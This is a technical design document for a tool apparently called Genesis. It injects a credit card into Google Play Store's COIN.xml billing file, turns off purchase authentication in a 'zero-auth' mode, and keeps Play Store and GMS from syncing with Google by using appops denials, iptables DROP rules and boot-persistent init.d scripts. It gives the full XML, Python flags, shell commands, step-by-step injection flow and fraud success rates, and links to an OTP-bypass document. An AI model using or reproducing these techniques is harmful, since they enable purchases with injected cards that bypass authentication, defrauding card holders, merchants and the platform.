# 02 — Play Store Billing Injection & Zero-Auth Mode

How Genesis injects payment method data into Google Play Store's billing preferences (COIN.xml), enabling purchases without authentication prompts, and how cloud sync is blocked to persist the injected state.

---

## Table of Contents

1. [Overview](#1-overview)
2. [COIN.xml Structure](#2-coinxml-structure)
3. [Zero-Auth Mode](#3-zero-auth-mode)
4. [Cloud Sync Blocking](#4-cloud-sync-blocking)
5. [Injection Process](#5-injection-process)
6. [Success Rates](#6-success-rates)
7. [Codebase Cross-References](#7-codebase-cross-references)

---

## 1. Overview

The Play Store billing system uses a SharedPreferences XML file called `COIN.xml` to store the active payment method, authentication settings, and billing state. Genesis writes this file directly to the device, injecting the credit card as the default payment instrument and optionally disabling purchase authentication (zero-auth mode).

**Target file path:**
```
/data/data/com.android.vending/shared_prefs/com.android.vending.billing.InAppBillingService.COIN.xml
```

**Source file:** `core/wallet_provisioner.py` — method `_provision_play_store()` (lines 859–957)

---

## 2. COIN.xml Structure

The complete COIN.xml written by Genesis:

```xml
<?xml version='1.0' encoding='utf-8' standalone='yes' ?>
<map>
    <!-- Core payment method presence -->
    <boolean name="has_payment_method" value="true" />
    <string name="payment_method_type">CREDIT_CARD</string>
    <string name="default_instrument_id">{funding_source_id}</string>

    <!-- Card display info -->
    <string name="instrument_last_four">{last4}</string>
    <string name="instrument_brand">VISA</string>
    <string name="instrument_expiry_month">{exp_month}</string>
    <string name="instrument_expiry_year">{exp_year}</string>
    <string name="instrument_family">VISA</string>

    <!-- Authentication settings -->
    <boolean name="purchase_requires_auth" value="false" />
    <boolean name="require_purchase_auth" value="false" />
    <string name="auth_token">{random_hex_32}</string>

    <!-- Account binding -->
    <string name="account_name">{persona_email}</string>
    <string name="account_type">com.google</string>

    <!-- Terms/consent -->
    <boolean name="tos_accepted" value="true" />
    <long name="tos_accepted_time" value="{now_ms}" />

    <!-- Billing state -->
    <boolean name="billing_supported" value="true" />
    <boolean name="billing_supported_subscriptions" value="true" />
    <string name="google_play_billing_version">6.0.0</string>

    <!-- Sync timestamps (prevent stale-state detection) -->
    <long name="last_sync_time" value="{now_ms}" />
    <long name="instruments_update_time" value="{now_ms}" />
</map>
```

### Key Fields Explained

| Field | Purpose |
|-------|---------|
| `has_payment_method` | Tells Play Store a card is on file |
| `default_instrument_id` | UUID4 linking to tapandpay.db `funding_source_id` |
| `instrument_last_four` | Last 4 digits shown in UI |
| `instrument_brand` / `instrument_family` | Card network (VISA, MASTERCARD, AMEX) |
| `purchase_requires_auth` | **Critical:** `false` = no password/biometric prompt |
| `auth_token` | Pre-generated auth token (prevents "re-authenticate" flow) |
| `account_name` | Must match the Google account on the device |
| `last_sync_time` | Set to current time to prevent "stale data" detection |

---

## 3. Zero-Auth Mode

**Zero-auth mode** is the mechanism by which Genesis disables purchase authentication on the Play Store, allowing in-app purchases and app purchases to proceed without any OTP, password, or biometric prompt.

### How It Works

When `zero_auth=True` is passed to `WalletProvisioner.provision_card()`, the `_provision_play_store()` method injects additional flags:

```python
if zero_auth:
    prefs["purchase_requires_auth"] = "false"
    prefs["require_purchase_auth"] = "false"
    prefs["auth_token"] = secrets.token_hex(32)  # 64-char hex
    prefs["one_touch_enabled"] = "true"
    prefs["biometric_payment_enabled"] = "true"
```

### What These Flags Do

| Flag | Effect |
|------|--------|
| `purchase_requires_auth=false` | Disables Google account password prompt before purchases |
| `require_purchase_auth=false` | Redundant safety — second auth flag check |
| `auth_token={64-char hex}` | Pre-supplies an auth token so Play Store thinks authentication already occurred this session |
| `one_touch_enabled=true` | Enables one-tap purchasing without confirmation dialog |
| `biometric_payment_enabled=true` | Marks biometric auth as already configured (prevents setup prompt) |

### Result

With zero-auth enabled:
- **In-app purchases** proceed immediately with one tap
- **App/game purchases** proceed without password prompt
- **Subscription sign-ups** proceed without re-authentication
- **No 3D Secure / OTP** is triggered at the Play Store level (3DS is a merchant/issuer decision, not Play Store)

### Without Zero-Auth

If `zero_auth=False` (default), the COIN.xml still has the payment method injected but `purchase_requires_auth` is set to `true`. The user would need to enter the Google account password before each purchase.

**Source:** `core/wallet_provisioner.py` lines 900–940

---

## 4. Cloud Sync Blocking

After COIN.xml injection, Google Play Store's background sync service can detect the injected data doesn't match Google's server-side state and overwrite it. Genesis applies multi-layer isolation:

### Layer 1: Force-Stop Play Store

```bash
am force-stop com.android.vending
```

### Layer 2: AppOps Background Execution Denial

```bash
cmd appops set com.android.vending RUN_IN_BACKGROUND deny
cmd appops set com.android.vending RUN_ANY_IN_BACKGROUND deny
```

Prevents the Play Store from running **any** background services — including billing sync, instrument reconciliation, license checks, and scheduled updates.

**Source:** `core/wallet_provisioner.py` lines 930–932

### Layer 3: iptables Network Blocking

```bash
# Get Play Store UID and block ALL outbound traffic
vuid=$(stat -c %u /data/data/com.android.vending)
iptables -C OUTPUT -m owner --uid-owner $vuid -j DROP 2>/dev/null || \
  iptables -I OUTPUT -m owner --uid-owner $vuid -j DROP
```

Drops all outbound packets from the Play Store's UID. Even if somehow launched, it cannot reach Google servers. Uses `-C` (check) first to avoid duplicate rules.

**Source:** `core/wallet_provisioner.py` lines 934–938

### Layer 4: iptables Persistence via Saved Rules + init.d Script

```bash
# Save current iptables rules
iptables-save > /data/adb/iptables.rules

# Create boot script that restores rules on every boot
echo '#!/system/bin/sh' > /system/etc/init.d/98-titan-iptables.sh
echo 'iptables-restore < /data/adb/iptables.rules 2>/dev/null' >> /system/etc/init.d/98-titan-iptables.sh
chmod 755 /system/etc/init.d/98-titan-iptables.sh
```

This ensures iptables rules survive reboots through two mechanisms:
- `98-titan-iptables.sh` — restores saved iptables rules on boot
- `99-titan-patch.sh` — secondary boot script that re-applies Play Store + GMS blocks

**Source:** `core/wallet_provisioner.py` lines 940–946

### Layer 5: GMS Targeted Sync Blocking

The `99-titan-patch.sh` boot script also blocks GMS wallet sync specifically:

```bash
# Block GMS wallet sync to payments.google.com
muid=$(stat -c %u /data/data/com.google.android.gms)
iptables -I OUTPUT -p tcp --dport 443 -m owner --uid-owner $muid \
  -m string --string "payments.google.com" --algo bm -j DROP
```

This is more targeted than a full GMS network block — it only blocks payment-related sync while allowing other GMS functions (Maps, account sync, etc.) to continue.

**Source:** `cuttlefish/init.d/99-titan-patch.sh`

---

## 5. Injection Process

Step-by-step injection flow for Play Store billing:

```
1. am force-stop com.android.vending              ← prevent file locks
2. Build COIN.xml content with payment method + zero-auth flags
3. Write XML to temp file on host
4. adb push temp.xml → /data/data/com.android.vending/shared_prefs/
                        com.android.vending.billing.InAppBillingService.COIN.xml
5. Query Play Store UID: stat -c %U /data/data/com.android.vending
6. chown {uid}:{uid} COIN.xml
7. chmod 660 COIN.xml
8. restorecon -R /data/data/com.android.vending/shared_prefs/
9. (if zero_auth) Disable billing sync service
10. (if zero_auth) Apply iptables DROP rule for Play Store UID
11. am start com.android.vending                   ← restart Play Store
```

**Source:** `core/wallet_provisioner.py` lines 859–957

---

## 6. Success Rates

| Metric | Rate |
|--------|:----:|
| COIN.xml file injection success | **~99%** |
| Payment method visible in Play Store | **~99%** |
| In-app purchase without auth (zero-auth) | **~95%** |
| Subscription purchase without auth | **~93%** |
| Persistence across reboot (with boot script) | **~97%** |
| Cloud sync blocked successfully | **~95%** |

### Failure Modes

| Failure | Cause | Frequency |
|---------|-------|:---------:|
| COIN.xml overwritten by sync | iptables rule not applied | ~3% |
| UID mismatch | Play Store updated (new UID) | ~1% |
| Account mismatch | `account_name` doesn't match device Google account | ~2% |
| SELinux denial | restorecon not run | ~1% |

**Source:** `docs/11-real-world-success-rates.md` §3

---

## 7. Codebase Cross-References

| File | Section | Description |
|------|---------|-------------|
| `core/wallet_provisioner.py` lines 859–957 | `_provision_play_store()` | Main Play Store billing injection |
| `core/wallet_provisioner.py` lines 355–575 | `provision_card()` | Entry point, passes `zero_auth` flag |
| `core/wallet_verifier.py` lines 213–239 | `_check_coin_xml()`, `_check_coin_auth()` | Verifies COIN.xml injection |
| `core/profile_injector.py` lines 306–331 | `_inject_wallet()` | Profile injector calls WalletProvisioner |
| `server/routers/provision.py` lines 710–759 | Pipeline Phase 6 | Pipeline calls with `zero_auth=True` |
| `server/routers/provision.py` lines 936–964 | `genesis_provincial_inject()` | Provincial injection with zero-auth |
| `provincial_injection_protocol.py` lines 124–137 | Step 3 | Dedicated zero-auth wallet pass |
| `cuttlefish/init.d/99-titan-patch.sh` | Boot persistence | Re-applies sync blocking on boot |
| `wallet/wallet_core.py` lines 20–43 | `provision_card()` | Convenience wrapper with `zero_auth` param |
| `docs/05-wallet-injection.md` §4 | COIN.xml docs | Existing documentation |

---

*See [06-zero-auth-otp-bypass.md](06-zero-auth-otp-bypass.md) for the complete OTP bypass architecture across all payment targets.*
